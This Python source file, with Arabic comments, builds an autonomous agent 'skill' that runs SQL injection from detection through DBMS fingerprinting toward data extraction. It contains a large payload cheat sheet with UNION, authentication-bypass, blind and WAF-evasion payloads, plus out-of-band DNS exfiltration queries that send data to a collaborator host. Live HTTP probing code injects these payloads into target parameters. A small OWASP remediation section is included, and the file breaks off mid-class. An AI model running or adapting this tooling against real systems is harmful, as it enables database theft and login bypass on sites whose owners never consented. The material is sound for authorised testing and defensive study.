"""
SQLi Autonomous Skill — State Machine for Objective-Aware SQL Injection Exploitation
======================================================================================
يُحول الـAgent من "اكتشف SQLi ثم توقف" إلى "اكتشف → استغل → تحقق من الهدف → اكتمل".

State Machine:
  DETECT → CLASSIFY → FINGERPRINT → COUNT_COLS → TEXT_COLS
  → UNION_VERIFY → EXTRACT → CHECK_OBJ → COMPLETE | FAILED
"""
import re
import time
import logging
import asyncio
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any

import httpx

log = logging.getLogger("sqli_skill")

# ─────────────────────────────────────────────────────────────────────────────
# States
# ─────────────────────────────────────────────────────────────────────────────
class SQLiState(Enum):
    DETECT       = auto()   # هل الـparam قابل للـinjection؟
    CLASSIFY     = auto()   # نوع الـinjection (string/numeric, error/blind)
    FINGERPRINT  = auto()   # نوع قاعدة البيانات (Oracle/MySQL/MSSQL/PG)
    COUNT_COLS   = auto()   # عدد الأعمدة في الـquery
    TEXT_COLS    = auto()   # أي أعمدة تقبل نصوص؟
    UNION_VERIFY = auto()   # تأكيد UNION يعمل
    EXTRACT      = auto()   # استخراج البيانات المطلوبة
    CHECK_OBJ    = auto()   # هل الهدف اكتمل؟
    COMPLETE     = auto()   # ✅
    FAILED       = auto()   # ❌


class DBMSType(Enum):
    ORACLE    = "oracle"
    MYSQL     = "mysql"
    MSSQL     = "mssql"
    POSTGRES  = "postgres"
    UNKNOWN   = "unknown"


# ─────────────────────────────────────────────────────────────────────────────
# PortSwigger SQL Injection Cheat Sheet
# https://portswigger.net/web-security/sql-injection/cheat-sheet
# ─────────────────────────────────────────────────────────────────────────────
SQLI_CHEAT_SHEET: Dict = {

    # ── String Concatenation ──────────────────────────────────────────────────
    "concat": {
        DBMSType.ORACLE:   "'foo'||'bar'",
        DBMSType.MSSQL:    "'foo'+'bar'",
        DBMSType.POSTGRES: "'foo'||'bar'",
        DBMSType.MYSQL:    "CONCAT('foo','bar')",
        DBMSType.UNKNOWN:  "CONCAT('foo','bar')",
    },

    # ── Substring ─────────────────────────────────────────────────────────────
    "substring": {
        DBMSType.ORACLE:   "SUBSTR('{str}',{offset},{len})",
        DBMSType.MSSQL:    "SUBSTRING('{str}',{offset},{len})",
        DBMSType.POSTGRES: "SUBSTRING('{str}',{offset},{len})",
        DBMSType.MYSQL:    "SUBSTRING('{str}',{offset},{len})",
        DBMSType.UNKNOWN:  "SUBSTRING('{str}',{offset},{len})",
    },

    # ── Comment Syntax ────────────────────────────────────────────────────────
    "comment": {
        DBMSType.ORACLE:   "--",
        DBMSType.MSSQL:    "--",
        DBMSType.POSTGRES: "--",
        DBMSType.MYSQL:    "-- ",   # space after --
        DBMSType.UNKNOWN:  "--",
    },

    # ── Database Version ──────────────────────────────────────────────────────
    "version": {
        DBMSType.ORACLE:   [
            "SELECT BANNER FROM v$version",
            "SELECT BANNER FROM v$version WHERE ROWNUM=1",
            "SELECT version FROM v$instance",
        ],
        DBMSType.MSSQL:    ["SELECT @@version"],
        DBMSType.POSTGRES: ["SELECT version()"],
        DBMSType.MYSQL:    ["SELECT @@version"],
        DBMSType.UNKNOWN:  ["SELECT @@version", "SELECT version()"],
    },

    # ── Database Contents (Schema Enumeration) ────────────────────────────────
    "tables": {
        DBMSType.ORACLE:   "SELECT table_name FROM all_tables",
        DBMSType.MSSQL:    "SELECT table_name FROM information_schema.tables",
        DBMSType.POSTGRES: "SELECT table_name FROM information_schema.tables",
        DBMSType.MYSQL:    "SELECT table_name FROM information_schema.tables",
        DBMSType.UNKNOWN:  "SELECT table_name FROM information_schema.tables",
    },
    "columns": {
        DBMSType.ORACLE:   "SELECT column_name FROM all_tab_columns WHERE table_name='{table}'",
        DBMSType.MSSQL:    "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        DBMSType.POSTGRES: "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        DBMSType.MYSQL:    "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        DBMSType.UNKNOWN:  "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
    },

    # ── Conditional Errors (Error-Based SQLi) ─────────────────────────────────
    "conditional_error": {
        DBMSType.ORACLE:   "SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual",
        DBMSType.MSSQL:    "SELECT CASE WHEN ({cond}) THEN 1/0 ELSE NULL END",
        DBMSType.POSTGRES: "1=(SELECT CASE WHEN ({cond}) THEN 1/(SELECT 0) ELSE NULL END)",
        DBMSType.MYSQL:    "SELECT IF({cond},(SELECT table_name FROM information_schema.tables),'a')",
        DBMSType.UNKNOWN:  "SELECT CASE WHEN ({cond}) THEN 1/0 ELSE NULL END",
    },

    # ── Extracting Data via Visible Error Messages ─────────────────────────────
    "error_extraction": {
        DBMSType.MSSQL:    "SELECT 'x' WHERE 1=(SELECT '{query}')",
        DBMSType.POSTGRES: "SELECT CAST(({query}) AS int)",
        DBMSType.MYSQL:    "SELECT 'x' WHERE 1=1 AND EXTRACTVALUE(1,CONCAT(0x5c,({query})))",
        # Oracle doesn't support direct visible error extraction this way
        DBMSType.ORACLE:   None,
        DBMSType.UNKNOWN:  "SELECT CAST(({query}) AS int)",
    },

    # ── Batched/Stacked Queries ───────────────────────────────────────────────
    "stacked": {
        DBMSType.ORACLE:   None,           # لا تدعم stacked queries
        DBMSType.MSSQL:    "{q1}; {q2}",
        DBMSType.POSTGRES: "{q1}; {q2}",
        DBMSType.MYSQL:    "{q1}; {q2}",   # نادر الاستخدام
        DBMSType.UNKNOWN:  "{q1}; {q2}",
    },

    # ── Time Delays (Blind SQLi — Unconditional) ──────────────────────────────
    "sleep": {
        DBMSType.ORACLE:   "dbms_pipe.receive_message(('a'),{secs})",
        DBMSType.MSSQL:    "WAITFOR DELAY '0:0:{secs}'",
        DBMSType.POSTGRES: "SELECT pg_sleep({secs})",
        DBMSType.MYSQL:    "SELECT SLEEP({secs})",
        DBMSType.UNKNOWN:  "SELECT SLEEP({secs})",
    },

    # ── Conditional Time Delays (Blind Boolean SQLi) ──────────────────────────
    "conditional_sleep": {
        DBMSType.ORACLE:   (
            "SELECT CASE WHEN ({cond}) THEN 'a'||"
            "dbms_pipe.receive_message(('a'),{secs}) ELSE NULL END FROM dual"
        ),
        DBMSType.MSSQL:    "IF ({cond}) WAITFOR DELAY '0:0:{secs}'",
        DBMSType.POSTGRES: (
            "SELECT CASE WHEN ({cond}) THEN pg_sleep({secs}) "
            "ELSE pg_sleep(0) END"
        ),
        DBMSType.MYSQL:    "SELECT IF({cond},SLEEP({secs}),'a')",
        DBMSType.UNKNOWN:  "SELECT IF({cond},SLEEP({secs}),'a')",
    },

    # ── DNS Lookup (Out-of-Band Exfiltration) ─────────────────────────────────
    "dns_lookup": {
        DBMSType.ORACLE:   (
            "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            "<!DOCTYPE root [ <!ENTITY % remote SYSTEM "
            "\"http://{collaborator}/\"> %remote;]>'),'/l') FROM dual"
        ),
        DBMSType.MSSQL:    "exec master..xp_dirtree '//{collaborator}/a'",
        DBMSType.POSTGRES: "copy (SELECT '') to program 'nslookup {collaborator}'",
        DBMSType.MYSQL:    "LOAD_FILE('\\\\\\\\{collaborator}\\\\a')",  # Windows only
        DBMSType.UNKNOWN:  "exec master..xp_dirtree '//{collaborator}/a'",
    },

    # ── DNS Lookup with Data Exfiltration (OOB) ───────────────────────────────
    "dns_exfil": {
        DBMSType.ORACLE:   (
            "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            "<!DOCTYPE root [ <!ENTITY % remote SYSTEM "
            "\"http://'||({query})||'.{collaborator}/\"> %remote;]>'),'/l') FROM dual"
        ),
        DBMSType.MSSQL:    (
            "declare @p varchar(1024);"
            "set @p=({query});"
            "exec('master..xp_dirtree \"//'+@p+'.{collaborator}/a\"')"
        ),
        DBMSType.POSTGRES: (
            "create OR replace function f() returns void as $$"
            "declare c text;declare p text;begin"
            "SELECT into p ({query});"
            "c := 'copy (SELECT '''') to program ''nslookup '||p||'.{collaborator}''';"
            "execute c;END;$$ language plpgsql security definer;SELECT f();"
        ),
        DBMSType.MYSQL:    "SELECT ({query}) INTO OUTFILE '\\\\\\\\{collaborator}\\\\a'",
        DBMSType.UNKNOWN:  None,
    },

    # ── UNION-Based Version Payloads (ready-to-inject) ─────────────────────────
    "union_version_payloads": {
        DBMSType.ORACLE: [
            "' UNION SELECT BANNER, NULL FROM v$version--",
            "' UNION SELECT NULL, BANNER FROM v$version--",
            "' UNION SELECT BANNER, BANNER FROM v$version--",
            "' UNION SELECT BANNER, NULL FROM v$version WHERE ROWNUM=1--",
            "' UNION SELECT NULL, BANNER FROM v$version WHERE ROWNUM=1--",
            "' UNION SELECT BANNER, 'test' FROM v$version--",
            "' UNION SELECT 'test', BANNER FROM v$version--",
            "' UNION SELECT version, NULL FROM v$instance--",
            "' UNION SELECT NULL, version FROM v$instance--",
            "' UNION SELECT BANNER_FULL, NULL FROM v$version--",
        ],
        DBMSType.MYSQL: [
            "' UNION SELECT @@version,NULL--",
            "' UNION SELECT NULL,@@version--",
            "' UNION SELECT version(),NULL--",
            "' UNION SELECT @@version,NULL#",
        ],
        DBMSType.MSSQL: [
            "' UNION SELECT @@version,NULL--",
            "' UNION SELECT NULL,@@version--",
            "' UNION SELECT CAST(@@version AS NVARCHAR(MAX)),NULL--",
        ],
        DBMSType.POSTGRES: [
            "' UNION SELECT version(),NULL--",
            "' UNION SELECT NULL,version()--",
        ],
        DBMSType.UNKNOWN: [
            "' UNION SELECT @@version,NULL--",
            "' UNION SELECT version(),NULL--",
            "' UNION SELECT NULL,@@version--",
        ],
    },

    # ── Blind Boolean SQLi — True/False baseline payloads ─────────────────────
    "blind_boolean": {
        "true":  ["' AND 1=1--", "' AND 'a'='a'--", "1 AND 1=1--"],
        "false": ["' AND 1=2--", "' AND 'a'='b'--", "1 AND 1=2--"],
    },

    # ── Entry Point Detection (PayloadsAllTheThings) ──────────────────────────
    "entry_point": {
        "basic": [
            "'", '"', ";", ")", "*",              # simple chars
            "%27", "%22", "%23", "%3B", "%29",    # URL-encoded
            "%%2727", "%25%27",                   # double-encoded
        ],
        "tautology": [
            "' OR '1'='1",
            "' OR 1=1--",
            "1 OR 1=1",
            "admin' OR '1'='1'--",
            "' OR 'x'='x",
        ],
        "merging": [
            "'+HERP", "'||'DERP", "'+'herp", "' 'DERP",
            "'%20'HERP", "'%2B'HERP",
        ],
        "logic_test": [
            "page.asp?id=1 or 1=1 --",
            "page.asp?id=1' or 1=1 --",
            "page.asp?id=1\" or 1=1 --",
            "page.asp?id=1 and 1=2 --",
        ],
        "timing": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND BENCHMARK(2000000,MD5(NOW()))--",
        ],
    },

    # ── DBMS Identification — Keyword-Based (PayloadsAllTheThings) ────────────
    "dbms_identify_keyword": {
        DBMSType.MYSQL: [
            "conv('a',16,2)=conv('a',16,2)",
            "connection_id()=connection_id()",
            "crc32('MySQL')=crc32('MySQL')",
        ],
        DBMSType.MSSQL: [
            "BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)",
            "@@CONNECTIONS>0",
            "@@CONNECTIONS=@@CONNECTIONS",
            "@@CPU_BUSY=@@CPU_BUSY",
            "USER_ID(1)=USER_ID(1)",
        ],
        DBMSType.ORACLE: [
            "ROWNUM=ROWNUM",
            "RAWTOHEX('AB')=RAWTOHEX('AB')",
            "LNNVL(0=123)",
        ],
        DBMSType.POSTGRES: [
            "5::int=5",
            "5::integer=5",
            "pg_client_encoding()=pg_client_encoding()",
            "get_current_ts_config()=get_current_ts_config()",
            "quote_literal(42.5)=quote_literal(42.5)",
            "current_database()=current_database()",
        ],
        DBMSType.UNKNOWN: [
            "1=1",
            "connection_id()=connection_id()",
            "ROWNUM=ROWNUM",
        ],
    },

    # ── DBMS Identification — Error Message Signatures ─────────────────────────
    "dbms_error_signatures": {
        DBMSType.MYSQL:    [
            "You have an error in your SQL syntax",
            "mysql_fetch_array()",
            "MySqlException",
        ],
        DBMSType.POSTGRES: [
            "ERROR: unterminated quoted string",
            "ERROR: syntax error at or near",
            "org.postgresql",
        ],
        DBMSType.MSSQL:    [
            "Unclosed quotation mark after the character string",
            "Incorrect syntax near",
            "The conversion of the varchar value",
            "Microsoft OLE DB Provider for SQL Server",
        ],
        DBMSType.ORACLE:   [
            "ORA-00933: SQL command not properly ended",
            "ORA-01756: quoted string not properly terminated",
            "ORA-00923: FROM keyword not found where expected",
            "ORA-00907: missing right parenthesis",
        ],
        DBMSType.UNKNOWN:  [],
    },

    # ── Authentication Bypass Payloads ────────────────────────────────────────
    "auth_bypass": {
        "classic": [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "' or 1=1 limit 1 --",
            "admin'--",
            "admin' #",
            "') OR ('1'='1",
            "' OR 'x'='x",
        ],
        "union_hash": [
            # Inject MD5("P@ssw0rd") = 161ebd7d45089b3446ee4e0d86dbcf92
            "admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'--",
        ],
        "raw_md5_bypass": {
            # PHP md5($password, true) bypass — raw binary output
            "ffifdyop":          "'or'",
            "129581926211651571912466741651878684928": "'or'",
        },
    },

    # ── WAF Bypass — No Space Allowed ─────────────────────────────────────────
    "waf_no_space": {
        "alt_whitespace": {
            "tab":            "%09",
            "newline":        "%0A",
            "vertical_tab":   "%0B",
            "form_feed":      "%0C",
            "carriage_return":"%0D",
            "nbsp":           "%A0",
        },
        # ASCII whitespace chars supported by each DBMS (from PayloadsAllTheThings)
        "dbms_whitespace": {
            DBMSType.MYSQL:    ["09","0A","0B","0C","0D","A0","20"],
            DBMSType.POSTGRES: ["0A","0D","0C","09","20"],
            DBMSType.MSSQL:    ["01","20"],   # 01–1F range
            DBMSType.ORACLE:   ["00","0A","0D","0C","09","20"],
            DBMSType.UNKNOWN:  ["09","0A","20"],
        },
        "comment_bypass": [
            "?id=1/*comment*/AND/**/1=1/**/--",
            "?id=1/*!12345UNION*//*!12345SELECT*/1--",
            "?id=(1)and(1)=(1)--",
        ],
    },

    # ── WAF Bypass — No Comma Allowed ─────────────────────────────────────────
    "waf_no_comma": {
        "limit":    {"original": "LIMIT 0,1",           "bypass": "LIMIT 1 OFFSET 0"},
        "substr":   {"original": "SUBSTR('SQL',1,1)",   "bypass": "SUBSTR('SQL' FROM 1 FOR 1)"},
        "union_4":  {
            "original": "UNION SELECT 1,2,3,4",
            "bypass": "UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d",
        },
    },

    # ── WAF Bypass — No Equal Allowed ─────────────────────────────────────────
    "waf_no_equal": {
        "LIKE":     "SUBSTRING(VERSION(),1,1)LIKE(5)",
        "NOT IN":   "SUBSTRING(VERSION(),1,1)NOT IN(4,3)",
        "IN":       "SUBSTRING(VERSION(),1,1)IN(4,3)",
        "BETWEEN":  "SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4",
    },

    # ── WAF Bypass — Case Modification & Keyword Substitution ─────────────────
    "waf_case": {
        "keywords": {
            "AND": ["AND", "and", "aNd", "&&"],
            "OR":  ["OR",  "or",  "oR",  "||"],
            "=":   ["LIKE", "REGEXP", "BETWEEN", "IN"],
            ">":   ["NOT BETWEEN 0 AND X"],
            "WHERE": ["HAVING"],
            "SPACE": ["%09", "%0A", "/**/", "/*!*/"],
        },
    },

    # ── Polyglot Injection (works across multiple contexts) ───────────────────
    "polyglot": [
        "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
        "1' AND SLEEP(5)-- AND '1'='1",
        "1;SELECT SLEEP(5)--",
    ],

    # ── Routed Injection (PayloadsAllTheThings) ───────────────────────────────
    "routed": {
        "description": (
            "The result of the first SQL query is used to build the second. "
            "Format: ' union select 0xHEXVALUE --"
        ),
        "examples": [
            # 0x2720756e696f6e2073656c65637420312c3223 = ' union select 1,2#
            "' union select 0x2720756e696f6e2073656c65637420312c3223#",
            # -1' union select login,password from users-- a
            "-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a",
        ],
    },

    # ── BENCHMARK as Time-Delay Alternative ───────────────────────────────────
    "benchmark": {
        DBMSType.MYSQL:    "BENCHMARK(2000000,MD5(NOW()))",
        DBMSType.POSTGRES: "pg_sleep({secs})",
        DBMSType.MSSQL:    "WAITFOR DELAY '0:0:{secs}'",
        DBMSType.ORACLE:   "dbms_pipe.receive_message(('a'),{secs})",
        DBMSType.UNKNOWN:  "BENCHMARK(2000000,MD5(NOW()))",
    },

    # ── Error-Based Blind Injection (SQLite example) ──────────────────────────
    "blind_error_based": {
        "sqlite_true":  "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A --",
        "sqlite_false": "' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A --",
    },

    # ── Second Order SQLi (detection hints) ───────────────────────────────────
    "second_order": {
        "description": (
            "Payload stored in DB during registration/update, "
            "executed later when retrieved by another function. "
            "Check: profile updates, username changes, password resets."
        ),
        "test_inputs": [
            "attacker'--",
            "attacker' OR '1'='1",
            "test\\' OR 1=1--",
        ],
    },

    # ── OWASP Remediation Guidance (Prevention Cheat Sheet) ───────────────────
    "owasp_remediation": {
        "primary_defenses": [
            "Option 1 (BEST): Use Prepared Statements with Parameterized Queries",
            "Option 2: Use Properly Constructed Stored Procedures",
            "Option 3: Allow-list Input Validation",
            "Option 4 (DISCOURAGED): Escape All User-Supplied Input",
        ],
        "additional_defenses": [
            "Least Privilege: Grant only necessary DB permissions (no DBA/admin to app accounts)",
            "Separate DB users per web application",
            "Use SQL Views to restrict access to sensitive columns",
            "Allow-list Input Validation as secondary defense",
        ],
        "code_example_java_safe": (
            "String query = \"SELECT account_balance FROM user_data WHERE user_name = ?\";\n"
            "PreparedStatement pstmt = connection.prepareStatement(query);\n"
            "pstmt.setString(1, custname);"
        ),
        "code_example_java_unsafe": (
            "String query = \"SELECT account_balance FROM user_data WHERE user_name = \"\n"
            "             + request.getParameter(\"customerName\");"
        ),
        "severity_note": (
            "SQLi is OWASP Top 10 #3 (Injection). Impact: full DB compromise, "
            "data theft, authentication bypass, RCE via stacked queries."
        ),
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# Data containers
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class SQLiContext:
    """كل المعلومات المُجمَّعة أثناء تنفيذ الـState Machine"""
    target_url:     str
    param_name:     str
    proxy:          Optional[str] = None
    objective:      str = "retrieve_db_version"

    # مُكتشَف أثناء التنفيذ
    state:          SQLiState = SQLiState.DETECT
    dbms:           DBMSType  = DBMSType.UNKNOWN
    injection_type: str = "unknown"      # string / numeric
    technique:      str = "unknown"      # union / error / blind
    col_count:      int = 0
    text_cols:      List[int] = field(default_factory=list)
    union_payload:  str = ""
    extracted_data: str = ""
    objective_met:  bool = False
    evidence:       List[Dict] = field(default_factory=list)
    logs:           List[str]  = field(default_factory=list)
    error:          str = ""
    fallback_used:    bool = False
    fallback_engine:  Optional[str] = None
    fallback_details: Optional[str] = None

    def log(self, msg: str):
        log.info(msg)
        self.logs.append(msg)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP helper
# ─────────────────────────────────────────────────────────────────────────────
class _HTTPProbe:
    """مُساعد HTTP مع دعم الـproxy وتوحيد الـheaders"""

    HEADERS = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    }

    def __init__(self, proxy: Optional[str] = None, timeout: float = 15.0):
        # httpx ≥0.28 uses `proxy=` (single str), older uses `proxies=` dict
        import httpx as _httpx
        _ver = tuple(int(x) for x in _httpx.__version__.split(".")[:2])
        if proxy:
            if _ver >= (0, 28):
                client_kwargs = {"proxy": proxy}
            else:
                client_kwargs = {"proxies": {"http://": proxy, "https://": proxy}}
        else:
            client_kwargs = {}

        self._client = httpx.AsyncClient(
            **client_kwargs,
            headers=self.HEADERS,
            verify=False,
            follow_redirects=True,
            timeout=timeout,
        )

    async def get(self, url: str, params: Dict[str, str]) -> httpx.Response:
        return await self._client.get(url, params=params)

    async def aclose(self):
        await self._client.aclose()

    def _inject(self, base_url: str, param: str, payload: str) -> Dict[str, str]:
        """بناء الـparams dict مع الـpayload المُدرج"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(base_url)
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        qs[param] = payload
        return qs


# ─────────────────────────────────────────────────────────────────────────────
# 1. Detector
# ─────────────────────────────────────────────────────────────────────────────
class SQLiDetector:
    """
    يكتشف SQLi بمقارنة 3 ردود:
      baseline (قيمة صحيحة) vs probe (payload) vs control (قيمة خاطئة)
    """

    CONFIRM_PAYLOADS = [
        ("' OR 1=1--",     "1' AND '1'='2"),
        ("' OR '1'='1'--", "' AND '1'='2'--"),
        ("1 OR 1=1--",     "1 AND 1=2--"),
        ("' OR 1=1#",      "' AND 1=2#"),
    ]

    async def detect(self, ctx: SQLiContext, http: _HTTPProbe) -> bool:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        original_val = qs.get(ctx.param_name, "test")

        # baseline
        try:
            r_base = await http.get(base_url, {**qs, ctx.param_name: original_val})
            base_len = len(r_base.text)
            base_body = r_base.text.lower()
        except Exception as e:
            ctx.log(f"[DETECT] Baseline request failed: {e}")
            return False

        test_pairs = list(self.CONFIRM_PAYLOADS)
        if original_val and original_val not in ("test", "1"):
            test_pairs.extend([
                (f"{original_val}' OR 1=1--", f"{original_val}' AND 1=2--"),
                (f"{original_val}'+OR+1=1--", f"{original_val}'+AND+1=2--"),
                (f"{original_val}'", f"{original_val}''"),
            ])

        for probe_payload, control_payload in test_pairs:
            try:
                r_probe   = await http.get(base_url, {**qs, ctx.param_name: probe_payload})
                r_control = await http.get(base_url, {**qs, ctx.param_name: control_payload})
            except Exception:
                continue

            probe_len   = len(r_probe.text)
            control_len = len(r_control.text)
            probe_body  = r_probe.text.lower()

            # اكتشاف بـ3 طرق:
            # 1. اختلاف استجابة الـ probe (True) عن الـ control (False)
            # 2. خطأ SQL أو خطأ خادم في الـ probe
            # 3. اختلاف حالة الـ HTTP
            size_diff   = abs(probe_len - control_len) > 30
            status_diff = (r_probe.status_code != r_control.status_code)
            error_found = any(e in probe_body for e in [
                "ora-", "mysql_fetch", "sqlite_", "syntax error",
                "unclosed quotation", "quoted string not properly terminated",
                "you have an error in your sql syntax",
            ])

            if error_found or size_diff or status_diff:
                ctx.log(
                    f"[DETECT] SQLi confirmed | payload={probe_payload!r} "
                    f"| probe_len={probe_len} control_len={control_len}"
                )
                ctx.evidence.append({
                    "stage": "detect",
                    "payload": probe_payload,
                    "probe_len": probe_len,
                    "control_len": control_len,
                })
                return True

        ctx.log("[DETECT] No SQLi detected with standard payloads")
        return False


# ─────────────────────────────────────────────────────────────────────────────
# 1b. DBMS Identifier — Keyword-Based + Error-Signature
#     (PayloadsAllTheThings — DBMS Identification)
# ─────────────────────────────────────────────────────────────────────────────
class SQLiDBMSIdentifier:
    """
    يُحدّد نوع قاعدة البيانات بطريقتين موثّقتين من PayloadsAllTheThings:
    1. Keyword-Based: يُدرج payloads خاصة بكل DBMS ويرصد إذا كان الـresponse يتغير
    2. Error-Signature: يُرسل ' ويفحص رسالة الخطأ المُعادة

    مرجع:
      https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification
    """

    # خريطة تحويل الـsignature → DBMSType
    _ERROR_MAP: List[Tuple[str, DBMSType]] = [
        ("You have an error in your SQL syntax",              DBMSType.MYSQL),
        ("mysql_fetch_array",                                 DBMSType.MYSQL),
        ("MySqlException",                                    DBMSType.MYSQL),
        ("ERROR: unterminated quoted string",                 DBMSType.POSTGRES),
        ("ERROR: syntax error at or near",                    DBMSType.POSTGRES),
        ("org.postgresql",                                    DBMSType.POSTGRES),
        ("Unclosed quotation mark after the character string",DBMSType.MSSQL),
        ("Incorrect syntax near",                             DBMSType.MSSQL),
        ("The conversion of the varchar value",               DBMSType.MSSQL),
        ("Microsoft OLE DB Provider for SQL Server",          DBMSType.MSSQL),
        ("ORA-00933",                                         DBMSType.ORACLE),
        ("ORA-01756",                                         DBMSType.ORACLE),
        ("ORA-00923",                                         DBMSType.ORACLE),
        ("ORA-00907",                                         DBMSType.ORACLE),
        ("quoted string not properly terminated",             DBMSType.ORACLE),
    ]

    async def identify(self, ctx: SQLiContext, http: _HTTPProbe) -> DBMSType:
        """يُحدّد الـDBMS ويُحدّث ctx.dbms"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(ctx.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        # ── Method 1: Error-Signature (inject a single quote) ─────────────────
        for error_payload in ["'", "''", "\"", "1'"]:
            try:
                r = await http.get(base_url, {**qs, ctx.param_name: error_payload})
                for sig, dbms in self._ERROR_MAP:
                    if sig.lower() in r.text.lower():
                        ctx.log(f"[DBMS_ID] Error signature → {dbms.value.upper()} | sig={sig!r}")
                        ctx.dbms = dbms
                        return dbms
            except Exception:
                continue

        # ── Method 2: Keyword-Based (inject DBMS-specific function) ───────────
        for dbms, probes in SQLI_CHEAT_SHEET["dbms_identify_keyword"].items():
            if dbms == DBMSType.UNKNOWN:
                continue
            for probe in probes:
                payload = f"' AND {probe}--"
                try:
                    r_true  = await http.get(base_url, {**qs, ctx.param_name: payload})
                    r_false = await http.get(base_url, {**qs, ctx.param_name: "' AND 1=2--"})
                    if len(r_true.text) != len(r_false.text):
                        ctx.log(f"[DBMS_ID] Keyword probe → {dbms.value.upper()} | probe={probe!r}")
                        ctx.dbms = dbms
                        return dbms
                except Exception:
                    continue

        ctx.log("[DBMS_ID] Could not identify DBMS — defaulting to UNKNOWN")
        return DBMSType.UNKNOWN


# ─────────────────────────────────────────────────────────────────────────────
# 1c. WAF Bypasser — applies WAF bypass techniques to payloads
#     (PayloadsAllTheThings — Generic WAF Bypass)
# ─────────────────────────────────────────────────────────────────────────────
class SQLiWAFBypasser:
    """
    يُطبّق تقنيات تجاوز الـWAF على أي payload:
    - استبدال المسافات بأحرف بديلة
    - استبدال الكلمات المفتاحية بحالات مختلطة
    - استخدام التعليقات كـseparators
    - تجاوز قيود عدم السماح بالفواصل

    مرجع:
      https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#generic-waf-bypass
    """

    # بديل المسافة الافتراضي
    DEFAULT_SPACE_BYPASS = "/**/"

    def apply_no_space(self, payload: str, method: str = "comment") -> str:
        """يستبدل المسافات بالطريقة المحددة"""
        if method == "comment":
            return payload.replace(" ", "/**/")
        elif method == "tab":
            return payload.replace(" ", "%09")
        elif method == "newline":
            return payload.replace(" ", "%0A")
        elif method == "nbsp":
            return payload.replace(" ", "%A0")
        return payload

    def apply_case_variation(self, payload: str) -> str:
        """يُطبّق تنويع الحالات على الكلمات المفتاحية"""
        import re as _re
        variations = {
            "SELECT": "SeLeCt",
            "UNION":  "UnIoN",
            "FROM":   "fRoM",
            "WHERE":  "wHeRe",
            "AND":    "aNd",
            "OR":     "oR",
        }
        result = payload
        for word, variant in variations.items():
            result = _re.sub(rf'\b{word}\b', variant, result, flags=_re.I)
        return result

    def apply_no_comma(self, payload: str, col_count: int) -> str:
        """يُحوّل UNION SELECT 1,2,3 إلى JOIN syntax عند حظر الفواصل"""
        if "UNION SELECT" not in payload.upper():
            return payload
        # استخدام JOIN بديلاً عن الفواصل
        join_parts = [f"(SELECT {i+1})c{i}" for i in range(col_count)]
        join_expr = " JOIN ".join(join_parts)
        return f"' UNION SELECT * FROM {join_expr}--"

    def apply_no_equal(self, payload: str) -> str:
        """يستبدل = بـLIKE/BETWEEN عند حظر علامة المساواة"""
        return payload.replace("1=1", "1 LIKE 1").replace("1=2", "1 NOT BETWEEN 1 AND 1")

    def generate_bypass_variants(self, payload: str, dbms: DBMSType) -> List[str]:
        """يُولّد كل المتغيرات الممكنة لأي payload"""
        variants = [payload]
        # No-space variants
        for method in ["comment", "tab", "newline", "nbsp"]:
            variants.append(self.apply_no_space(payload, method))
        # Case variation
        variants.append(self.apply_case_variation(payload))
        # No-equal variant
        variants.append(self.apply_no_equal(payload))
        # Remove duplicates
        seen = set()
        result = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                result.append(v)
        return result

    def get_whitespace_chars(self, dbms: DBMSType) -> List[str]:
        """يعيد قائمة بديلات المسافة المدعومة لهذا الـDBMS"""
        return SQLI_CHEAT_SHEET["waf_no_space"]["dbms_whitespace"].get(
            dbms,
            SQLI_CHEAT_SHEET["waf_no_space"]["dbms_whitespace"][DBMSType.UNKNOWN],
        )


# ─────────────────────────────────────────────────────────────────────────────
# 2. DBMS Fingerprinter
# ─────────────────────────────────────────────────────────────────────────────
class SQLiDBMSFingerprinter:
    """يحدد نوع قاعدة البيانات من error messages أو سلوك الـquery الشرطي"""

    ORACLE_SIGS   = ["ora-", "oracle", "from dual", "v$version", "quoted string not properly terminated"]
    MYSQL_SIGS    = ["mysql_fetch", "you have an error in your sql syntax", "mysql", "information_schema"]
    MSSQL_SIGS    = ["unclosed quotation mark", "mssql", "sql server", "sqlserver", "@@version"]
